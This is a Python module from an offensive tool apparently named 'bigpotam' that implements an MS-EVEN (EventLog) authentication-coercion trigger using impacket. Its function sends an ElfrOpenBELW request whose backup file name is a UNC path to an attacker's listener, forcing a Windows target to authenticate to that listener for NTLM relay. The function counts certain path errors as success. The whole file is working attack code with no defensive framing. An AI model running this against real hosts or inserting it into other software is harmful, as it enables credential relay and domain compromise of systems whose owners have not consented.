"""MS-EVEN trigger function."""

import logging
import random
import string

from impacket.dcerpc.v5 import even
from impacket.dcerpc.v5.dtypes import NULL

from bigpotam.methods import check_error

log = logging.getLogger("bigpotam")

# ERROR_BAD_NETPATH=0x35, STATUS_OBJECT_PATH_NOT_FOUND=0xC000003A (NTSTATUS)
_SUCCESS_CODES = {0x00000035, 0xC000003A}
_SUCCESS_STRINGS = (
    "ERROR_BAD_NETPATH",
    "STATUS_OBJECT_PATH_NOT_FOUND",
    "STATUS_CONNECTION_DISCONNECTED",
)


def _check_success(e):
    return check_error(e, _SUCCESS_CODES, _SUCCESS_STRINGS)


def _rnd(n=8):
    return "".join(random.choices(string.ascii_lowercase, k=n))


def trigger_elfr_open_belw(dce, listener, listener_port=None, **kw):
    """ElfrOpenBELW (opnum 9) — uses device path format."""
    try:
        request = even.ElfrOpenBELW()
        request["UNCServerName"] = NULL
        request["BackupFileName"] = f"\\??\\UNC\\{listener}\\{_rnd()}\\aa\x00"
        request["MajorVersion"] = 1
        request["MinorVersion"] = 1
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("ElfrOpenBELW: %s", e)
        return False
